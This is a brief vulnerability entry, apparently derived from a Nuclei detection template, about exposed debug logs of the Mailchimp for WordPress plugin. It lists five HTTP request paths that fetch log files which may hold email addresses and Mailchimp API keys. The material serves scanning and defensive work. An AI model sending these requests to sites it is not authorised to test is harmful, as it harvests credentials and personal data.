# Vulnerability: WordPress MC4WP - Debug Log Exposure
**Classification:** CWE-200
**Source:** Nuclei Template (`wp-mailchimp-log-exposure.yaml`)

## Description
Detected WordPress Mailchimp for WordPress (MC4WP) debug log. The log file may contain email addresses, Mailchimp API keys, and error details.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/uploads/mc4wp-debug.log
GET {{BaseURL}}/wp-content/uploads/mc4wp-debug-log.php
GET {{BaseURL}}/wp-content/uploads/mailchimp-for-wp/debug-log.php
GET {{BaseURL}}/wp-content/uploads/sites/1/mc4wp-debug-log.php
GET {{BaseURL}}/wp-content/uploads/sites/1/mailchimp-for-wp/debug-log.php
```

